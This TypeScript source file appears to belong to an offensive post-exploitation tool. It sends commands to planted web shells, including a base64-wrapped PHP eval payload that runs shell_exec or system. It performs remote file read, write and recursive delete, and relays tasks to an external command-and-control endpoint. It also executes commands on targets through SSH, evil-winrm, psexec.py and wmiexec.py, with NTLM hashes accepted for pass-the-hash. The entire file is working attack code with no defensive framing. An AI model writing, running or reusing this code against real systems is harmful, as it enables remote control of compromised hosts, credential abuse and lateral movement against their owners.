import http from 'node:http'
import https from 'node:https'
import { randomBytes } from 'node:crypto'
import { runProcess } from './shell.ts'

/** Keep TLS options per resource; never change process-wide TLS behavior. */
export async function request(url: string, options: { method?: string; headers?: Record<string, string>; data?: string; verifyTls?: boolean; timeout?: number; signal?: AbortSignal } = {}) {
  return new Promise<{ data: Buffer; headers: http.IncomingHttpHeaders; status: number }>((resolve, reject) => {
    const address = new URL(url), call = (address.protocol === 'https:' ? https : http).request(address, { method: options.method ?? 'GET', headers: options.headers, rejectUnauthorized: options.verifyTls !== false, signal: options.signal }, response => {
      const chunks: Buffer[] = []; let size = 0
      response.on('data', chunk => { size += chunk.length; if (size > 64 * 1024 * 1024) response.destroy(new Error('Response exceeds 64 MiB')); else chunks.push(chunk) })
      response.on('error', reject)
      response.on('end', () => { const data = Buffer.concat(chunks); if ((response.statusCode ?? 500) >= 400) reject(new Error(`HTTP ${response.statusCode}: ${data.toString().slice(0, 1000)}`)); else resolve({ data, headers: response.headers, status: response.statusCode ?? 200 }) })
    })
    call.setTimeout((options.timeout ?? 60) * 1000, () => call.destroy(new Error('Request timed out')))
    call.on('error', reject); call.end(options.data)
  })
}

export function operationCommand(action: string, args: Record<string, any>, metadata: Record<string, any>) {
  const windows = (metadata.os ?? (['asp', 'aspx'].includes(metadata.shell_type) ? 'windows' : 'linux')) === 'windows'
  if (action === 'command') { if (!args.command?.trim()) throw new Error('command is required'); return { command: args.command, token: null } }
  if (action === 'probe') { const token = `RT_${randomBytes(8).toString('hex')}`; return { command: windows ? `echo ${token}` : `printf %s ${token}`, token } }
  if (!args.path?.trim()) throw new Error('path is required')
  const quote = (s: string) => "'" + s.replaceAll("'", windows ? "''" : "'\"'\"'") + "'", p = quote(args.path)
  if (action === 'write_file' && (typeof args.content_base64 !== 'string' || !/^[A-Za-z0-9+/]*={0,2}$/.test(args.content_base64))) throw new Error('content_base64 is required')
  if (action === 'move_file' && !args.destination?.trim()) throw new Error('destination is required')
  const commands: Record<string, string> = windows ? {
    list_files: `Get-ChildItem -Force -LiteralPath ${p} | ForEach-Object { $kind=if($_.PSIsContainer){'d'}else{'f'}; $size=if($_.PSIsContainer){0}else{$_.Length}; Write-Output ($kind+[char]9+$_.Name+[char]9+$_.LastWriteTime.ToString('yyyy-MM-dd HH:mm:ss')+[char]9+$size+[char]9+$_.Mode) }`,
    read_file: `[Convert]::ToBase64String([IO.File]::ReadAllBytes(${p}))`, write_file: `[IO.File]::WriteAllBytes(${p},[Convert]::FromBase64String('${args.content_base64 ?? ''}'))`,
    create_directory: `[IO.Directory]::CreateDirectory(${p}) | Out-Null`, create_file: `[IO.File]::Open(${p},'OpenOrCreate').Dispose()`,
    move_file: `Move-Item -Force -LiteralPath ${p} -Destination ${quote(args.destination ?? '')}`, delete_file: `Remove-Item -Recurse -Force -LiteralPath ${p}`,
  } : {
    list_files: `find ${p} -mindepth 1 -maxdepth 1 -printf '%y\t%f\t%TY-%Tm-%Td %TH:%TM:%TS\t%s\t%m\n'`, read_file: `base64 -- ${p}`, write_file: `printf %s ${quote(args.content_base64 ?? '')} | base64 -d > ${p}`,
    create_directory: `mkdir -p -- ${p}`, create_file: `touch -- ${p}`, move_file: `mv -- ${p} ${quote(args.destination ?? '')}`, delete_file: `rm -rf -- ${p}`,
  }
  if (!commands[action]) throw new Error(`Unsupported WebShell action: ${action}`)
  return { command: windows ? `powershell -NoProfile -NonInteractive -EncodedCommand ${Buffer.from(commands[action], 'utf16le').toString('base64')}` : commands[action], token: null }
}

export async function executeWebshell(url: string, metadata: Record<string, any>, secret: Record<string, any>, action: string, args: Record<string, any>, signal?: AbortSignal) {
  const { command, token } = operationCommand(action, args, metadata), password = secret.password ?? '', key = metadata.command_param || password || 'cmd'
  let wire = command, markers: string[] | undefined
  if (metadata.shell_type === 'php' && ['auto', 'eval', 'antsword'].includes(metadata.protocol ?? 'eval')) {
    const marker = randomBytes(8).toString('hex'); markers = [`RTBEGIN${marker}`, `RTEND${marker}`]
    wire = `@set_time_limit(0);@ini_set('display_errors','0');$c=base64_decode('${Buffer.from(command).toString('base64')}');$o='';if(function_exists('shell_exec')){$o=@shell_exec($c.' 2>&1');}elseif(function_exists('exec')){$a=array();@exec($c.' 2>&1',$a);$o=implode("\\n",$a);}else{ob_start();@system($c.' 2>&1');$o=ob_get_clean();}echo '${markers[0]}'.base64_encode((string)$o).'${markers[1]}';`
  }
  const payload = new URLSearchParams({ [key]: wire }); if (metadata.password_param && password) payload.set(metadata.password_param, password)
  const method = (metadata.method ?? 'POST').toUpperCase(), address = new URL(url)
  if (method === 'GET') for (const [key, value] of payload) address.searchParams.set(key, value)
  const response = await request(address.href, { method, headers: { 'Content-Type': 'application/x-www-form-urlencoded', ...metadata.headers }, data: method === 'GET' ? undefined : payload.toString(), verifyTls: metadata.verify_tls, timeout: Math.max(1, Math.min(60, Number(metadata.timeout ?? 20))), signal })
  const encoding = !metadata.encoding || metadata.encoding === 'auto' ? /charset=([^;]+)/i.exec(String(response.headers['content-type']))?.[1] ?? 'utf-8' : metadata.encoding
  const decode = (buffer: Uint8Array) => new TextDecoder(encoding).decode(buffer)
  let output = decode(response.data)
  if (markers) { const start = output.indexOf(markers[0]), end = output.indexOf(markers[1], start + markers[0].length); if (start >= 0 && end > start) output = decode(Buffer.from(output.slice(start + markers[0].length, end).trim(), 'base64')) }
  if (token && !output.includes(token)) throw new Error('WebShell responded without the one-time probe token')
  return output
}

export async function executeOperation(resource: any, task: any, cwd: string, signal: AbortSignal) {
  const metadata = JSON.parse(resource.metadata_json), secret = JSON.parse(resource.secret_json), args = JSON.parse(task.input_json)
  if (resource.kind === 'webshell') return executeWebshell(resource.target, metadata, secret, task.action, args, signal)
  const timeout = Math.max(1, Math.min(300, Number(args.timeout ?? 60))), command = args.command
  if (!command) throw new Error('command is required')
  const type = metadata.shell_type ?? 'custom'
  if (metadata.connection_type === 'external_c2') {
    const endpoint = secret.endpoint || metadata.endpoint; if (!endpoint) throw new Error('External C2 adapter endpoint is required')
    return (await request(endpoint, { method: 'POST', data: JSON.stringify({ framework: metadata.framework || type, session_id: metadata.external_session_id || resource.target, action: task.action, arguments: args }), headers: { Accept: 'application/json, text/plain', 'Content-Type': 'application/json', ...(secret.token ? { Authorization: `Bearer ${secret.token}` } : {}) }, timeout, signal })).data.toString()
  }
  const username = secret.username || metadata.username || '', password = secret.password || secret.value || '', hash = secret.hash || secret.ntlm_hash || '', domain = secret.domain || metadata.domain || ''
  let executable: string, argv: string[], input: string | undefined, env: Record<string, string> = {}
  if (type === 'ssh') {
    executable = metadata.executable || 'ssh'; argv = ['-o', 'StrictHostKeyChecking=accept-new']
    if (metadata.port && metadata.port !== 22) argv.push('-p', String(metadata.port))
    if (secret.private_key_path) argv.push('-o', 'BatchMode=yes', '-i', secret.private_key_path)
    else if (password) { argv = ['-e', executable, ...argv]; executable = metadata.sshpass_executable || 'sshpass'; env = { SSHPASS: password } }
    else argv.push('-o', 'BatchMode=yes')
    argv.push(username ? `${username}@${resource.target}` : resource.target, command)
  } else if (type === 'evil_winrm') {
    executable = metadata.executable || 'evil-winrm'; argv = ['-i', resource.target, '-u', username, ...(password ? ['-p', password] : hash ? ['-H', hash] : [])]; input = `${command}\nexit\n`
  } else if (['psexec', 'wmi'].includes(type)) {
    executable = metadata.executable || (type === 'psexec' ? 'psexec.py' : 'wmiexec.py'); const principal = domain ? `${domain}/${username}` : username
    argv = [...(hash ? ['-hashes', hash] : []), `${principal}${password ? ':' + password : ''}@${resource.target}`, command]
  } else { executable = metadata.executable || type; argv = [...(metadata.arguments ?? []).map(String), resource.target, command] }
  const result = await runProcess(executable, argv, cwd, { signal, timeout, input, env })
  if (result.exitCode) throw new Error(result.text || `${type} exited with ${result.exitCode}`)
  return result.text
}
